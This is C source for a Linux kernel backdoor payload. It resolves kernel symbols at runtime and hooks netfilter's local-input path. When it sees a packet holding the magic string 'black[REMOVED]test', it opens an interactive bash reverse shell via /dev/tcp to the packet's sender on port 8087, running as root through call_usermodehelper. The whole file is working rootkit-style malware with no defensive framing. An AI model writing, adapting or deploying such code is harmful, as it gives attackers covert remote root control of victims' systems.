#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>

#define TOKEN "black-magic-test"

extern unsigned char __payload[];
extern unsigned char __payload_end[];

extern long lookup_name(const char *);

struct executor_t {
    struct execute_work ew;
    __be32 saddr;
};

////////////////////////////////////////////////////////////////////////////////
// Kernel API imports
////////////////////////////////////////////////////////////////////////////////

#ifdef printk
static typeof(_printk) *p_printk = NULL;
#else
static typeof(printk) *p_printk = NULL;
#endif
static typeof(lookup_name) *p_lookup_name = NULL;
static typeof(kmalloc) *p_kmalloc = NULL;
static typeof(kfree) *p_kfree = NULL;
static typeof(memcmp) *p_memcmp = NULL;
static typeof(call_usermodehelper) *p_call_umh = NULL;
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 13, 0)
static typeof(nf_register_hooks) *p_nf_register_hooks = NULL;
#else
static typeof(nf_register_net_hooks) *p_nf_register_net_hooks = NULL;
#endif
static typeof(execute_in_process_context) *p_execute_in_process_context = NULL;
static typeof(kasprintf) *p_kasprintf = NULL;

////////////////////////////////////////////////////////////////////////////////

static inline void *memmem(const void *h, size_t hlen, const void *n, size_t nlen) {
    if (!h || !hlen || !n || !nlen || (nlen > hlen))
        return NULL;

    while (hlen >= nlen) {
        if (!p_memcmp(h, n, nlen))
            return (void *)h;
        h++, hlen--;
    }

    return NULL;
}

static void delayed_work(struct work_struct *ws) {
    char *envp[2] = { "HOME=/proc", NULL };
    struct execute_work * exw = container_of(ws, struct execute_work, work);
    struct executor_t * executor = (struct executor_t *)exw;
    char *cmd = p_kasprintf(GFP_KERNEL, "bash -i >& /dev/tcp/%pI4/8087 0>&1", &executor->saddr);
#ifdef DEBUG
    p_printk("%s", cmd);
#endif
    char *argv[4] = { "/bin/sh", "-c", cmd, NULL };
    p_call_umh(argv[0], argv, envp, UMH_WAIT_EXEC);
    p_kfree(cmd);
    p_kfree(exw);
}

static void try_skb(struct sk_buff *skb) {
    if (memmem(skb->data, skb_headlen(skb), TOKEN, sizeof(TOKEN) - 1)) {
        struct iphdr *iph = (struct iphdr *)skb->data;
        struct executor_t * executor = p_kmalloc(sizeof(struct executor_t), GFP_ATOMIC);
        struct execute_work *ws = p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
        executor->ew = *ws;
        executor->saddr = iph->saddr;
        if (ws) p_execute_in_process_context(delayed_work, &executor->ew);
    }
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 1, 0)
static unsigned int custom_local_in(const struct nf_hook_ops *ops, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
    if (skb) try_skb(skb);
    return NF_ACCEPT;
}
#else
static unsigned int custom_local_in(void *arg, struct sk_buff *skb, const struct nf_hook_state *state) {
    if (skb) try_skb(skb);
    return NF_ACCEPT;
}
#endif

static struct nf_hook_ops nf_ops[] = {
    [0] = {
        .hook = (nf_hookfn *)NULL,
        .pf = NFPROTO_IPV4,
        .hooknum = NF_INET_LOCAL_IN,
        .priority = NF_IP_PRI_FIRST,
    },
};

static void init_nf_hooks(void *net) {
    nf_ops[0].hook = (void *)custom_local_in;
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 13, 0)
    p_nf_register_hooks(nf_ops, ARRAY_SIZE(nf_ops));
#else
    p_nf_register_net_hooks(net, nf_ops, ARRAY_SIZE(nf_ops));
#endif
}

long __attribute__((used, section(".text.entry"))) entry(const typeof(lookup_name) *lookup, void *net) {
    if (NULL == (p_lookup_name = lookup))
        return -EINVAL;

#ifdef printk
    p_printk = (void *)lookup("_printk");
#else
    p_printk = (void *)lookup("printk");
#endif
    if (!p_printk)
        return -EINVAL;

    p_call_umh = (void *)lookup("call_usermodehelper");
    if (!p_call_umh) {
        p_printk("no call_usermodehelper found\n");
        return -EINVAL;
    }

    p_kmalloc = (void *)lookup("__kmalloc");
    if (!p_kmalloc) {
        p_printk("no __kmalloc found\n");
        return -EINVAL;
    }

    p_kfree = (void *)lookup("kfree");
    if (!p_kfree) {
        p_printk("no kfree found\n");
        return -EINVAL;
    }

    p_memcmp = (void *)lookup("memcmp");
    if (!p_memcmp) {
        p_printk("no memcmp found\n");
        return -EINVAL;
    }

    p_kasprintf = (void *)lookup("kasprintf");
    if (!p_kasprintf) {
        p_printk("no kasprintf found\n");
        return -EINVAL;
    }

    p_execute_in_process_context = (void *)lookup("execute_in_process_context");
    if (!p_execute_in_process_context) {
        p_printk("no execute_in_process_context found\n");
        return -EINVAL;
    }

#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 13, 0)
    p_nf_register_hooks = (void *)lookup("nf_register_hooks");
    if (!p_nf_register_hooks) {
        p_printk("no nf_register_hooks found\n");
        return -EINVAL;
    }
#else
    p_nf_register_net_hooks = (void *)lookup("nf_register_net_hooks");
    if (!p_nf_register_net_hooks) {
        p_printk("no nf_register_net_hooks found\n");
        return -EINVAL;
    }
#endif

    init_nf_hooks(net);

    return 0;
}
